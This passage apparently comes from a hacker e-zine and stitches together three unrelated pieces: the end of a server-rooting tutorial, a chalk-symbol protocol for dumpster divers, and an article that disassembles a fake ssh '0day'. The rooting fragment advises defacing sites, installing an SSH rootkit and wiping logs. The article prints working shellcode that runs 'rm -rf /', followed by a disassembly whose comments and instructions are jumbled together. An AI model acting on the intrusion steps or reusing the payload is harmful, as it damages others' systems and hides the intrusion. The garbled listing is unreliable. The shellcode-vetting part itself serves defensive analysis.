wrong with exploit run or large file) we will get root To check if we got root:

	id or whoami

If it says root we got root! Now we can deface/mass deface all the sites of 
the server or to setup a rootkit (e.g. SSHDoor) and to take ssh/telnet shell 
access to the server. We must erase all logs in order to be safe with a log
cleaner. A good cleaner for this job is the MIG Log Cleaner.

1. INTRODUCTION
---------------

There�s a war going on out in our curbs, parking lots, and shopping centers. 
Dumpster divers are being harassed, dumpsters are being locked up, capitalism 
is trying to fix what is perhaps the most beautiful loophole it ever made -- a 
loophole that enables people to get free shit that would otherwise require them 
to surrender their labor and freedom to obtain.

The objective of the BINWRITING PROTOCOL is to transfer the excessive waste 
generated by business as usual to those community members who are seeking it, 
defend those who dive, and make our diving habits more effective -- eventually 
turning them into a revolutionary tool. Those who look in dumpsters often waste 
significant amounts of time looking through those which never have anything of 
interest in them. In some situations, divers are hurt by the contents of 
dumpsters or those who are used to guard them.

This protocol operates through chalking/markings/signs left near or on the 
dumpster. These markings indicate the safety, reliability, and utility of the 
dumpster.

An important feature of this protocol is that it allows anybody to participate 
in it and even change the protocol to suit their particular needs without 
threatening the protocol�s existence or utility.

2. The BINWRITING Model
-----------------------

The BINWRITING model is designed to be simple, easy to use, effective, and 
flexible. It protects the user from dumpsters that are dangerous, saves them 
time by indicating which dumpsters are worth looking at, and allows resources 
to be allocated in a truly democratic way. There are several symbols which are 
used in this proposal to indicate the value of a dumpster. As this is a proposal, 
we are asking that discussion around this proposal exist and be published widely
through whichever channel you prefer. These symbols can be combined in any 
variety that makes sense to the user and additional symbols not defined in the 
protocol can be added at the user�s convenience.


1. Open
 /
/
\
 \
 
This symbol, which is essentially a �greater than� symbol indicates that a 
dumpster is open and not hindered by locks, chains, or other methods of protection.
It is generally safe to look in and is not protected by guard dogs or any other 
dangerous items.


2. Closed
\  /
 \/
 /\
/  \

This symbol means that a dumpster is closed or dangerous. It�s a �diver beware�
notice. Adding multiples of this symbol can be used to demonstrate the severity of
a situation. For instance, a single symbol simply means that a dumpster is closed/
locked. Multiple symbols can be used to indicate a threat to safety, etc. If 
this symbol is added inside the open symbol (like the open symbol was a crocodile 
about to eat it) it would indicate that the dumpster was open but had nothing good
in it. Multiples of this symbol would indicate that it was open but contained 
hazardous materials such as used needles, broken glass, biohazards, toxic
chemicals, etc.


3. Good
   |
---+--- 
   |

This symbol indicates that a dumpster is worth looking in and usually has things 
of value (consumer goods, food, money, etc.). It is a giant plus. Multiples of 
this symbol show that the dumpster is very good. This can be used with the open 
symbol side-by-side or as an additive inside the open symbol. When used with 
the closed symbol, it indicates that while the dumpster is locked/hazardous, 
there are good things inside.


4. Battlegrounds

  &&&
&&_|_&&
&& | &&
  &&&

This symbol (crosshairs) indicates that a dumpster is a source of controversy. 
This commonly happens when a good dumpster suddenly gets locked, is turned into 
a compactor, etc. People are actively fighting to maintain this dumpster as 
(or turn it into) a community resource. When this is added it is a call to other
divers and community members to join in on the fight.

3. ACCEPTED MODES OF COMMENT
----------------------------

You may comment on this proposal through any channel you choose. We will be 
prowling the internets for references to this protocol, and if you put your 
comments/changes on an indymedia site or other community news site (infoshop, 
anarchistnews, etc.) it is more likely to be found. Comments may also be sent 
into the publication where you originally found this proposal.

After the public comment period (several months to allow for actual use), we will
consider all ideas/criticisms that have been presented and try to improve the 
proposal. The final result will be published through these same channels.

DIGESTING_SHELLCODE_LIKE_A_MOLLUSK:
-----------------------------------

Have you ever been looking on the net for some sick sploits and come across what 
you think might be a sick 0day? Word! Your pumped! But how do you know if you can
trust that chunk of shellcode in there not to join your box to someone else�s 
bot farm?

You need to check out that shell code of course, but how? The following simple 
perl app[9] that will dump the shellcode to a file so that we can disassemble it.

<code>
	#!/usr/bin/perl -w
	use strict;
	# This is the shellcode from HTZ #8 (txt only) ssh 0day
	my $shellcode =
	�\x6a\x0b\x58\x31\xf6\x56\x6a\x2f\x89\xe7\x56\x66\x68\x2d\x66�.
	�\x89\xe2\x56\x66\x68\x2d\x72\x89\xe1\x56\x68\x2f\x2f\x72\x6d�.
	�\x68\x2f\x62\x69\x6e\x89\xe3\x56\x57\x52\x51\x53\x89\xe1\x31�.
	�\xd2\xcd\x80�;
	open(FILE, �>shellcode.bin�);
	print FILE �$shellcode�;
	close(FILE);
</code>

Save the file out (ie. 0day.pl), and run it. The resulting binary file will be 
called shellcode.bin. You can now use ndisasm (from the nasm package), or udcli
from the Udis86 project[10]. It is reported by postmodern that the Udis86 
disassembler does a better job of handling relative jumps, it also supports 
AT&T assembler syntax and Intel syntax, where as nasm only supports Intel syntax.
I tried both disassemblers and both gave relatively the same output.

<commandline>
	$ ndiasm -b 32 shellcode.bin > shellcode.s
</commandline>

You will now have a assembly file that will contain the reversed asm for your 
shell code. The process of figuring out what it does is now a project of looking 
up each opcode in a reference manual for the architecture you compiled this on 
(see refernces at bottom of article). 

Below is the assembly file generated by gcc that I have gone through, looked up
the opcodes, and documented in line. I stripped the address information as it is 
not relavant to this shellcode.

<code>
	push byte +0xb ; 
		; push 11 onto the stach ; 
		; This is the system call number for sys_execve [11]
	pop eax; 
		; pop it off into eax. ; 
		;This is the register that is looked for when the
		; processor is interrupted for a system call (int 0x80)
	xor esi,esi ; 
		; clear esipush esi 
		; push 0 onto the stack push byte +0x2f 
		; push 47 on the stack mov edi,esp 
		; edi holds the stack pointer 
		; /
	push esi ; 
		; push 0 on the stack again 
		; Null terminating?push word 0x662d 
		; push 0x662d on the stack? mov edx,esp 
		; edx holds the stack now too 
		; -f
	push esi ; 
		; push 0on the stack again push word 0x722d 
		; push 0x722d on the stack 
		; this will be regs.ecx or ARGV 
		; -rmov ecx,esp 
		; ecx has the stack pointer now
	push esi ; 
		; push 0 on the stack again 
		; Null terminating a string?
	
	push 0x6d722f2f ;
		;/bin//rm push 0x6e69622f mov ebx,esp 
		; ebx has the stack pointer 
		; this is used by sys_execve as the 
		; struct pt_regs arg
	push esi ; 
		; push 0 on the stack again
	push edi 
		; Then it looks like the rest of the stack
		; is filled up with values for the remaining data
		; structure required by sys_execve()
	
	push edx
	push ecx
	push ebx
	mov ecx,esp
	xor edx,edx ; 0 out edx
	int 0x80 ;
	execve()
</code>

As you can see this is not a very friendly shellcode. I would 
recommend against running this 0day*. It can be useful to work from the 
bottom up. It should also be pointed out that strings are in reverse order 
then what you might expect. ie 0x6e69622f represents /bin event though 
2f = /, 62 = b, 69 = i, and 6e = n.
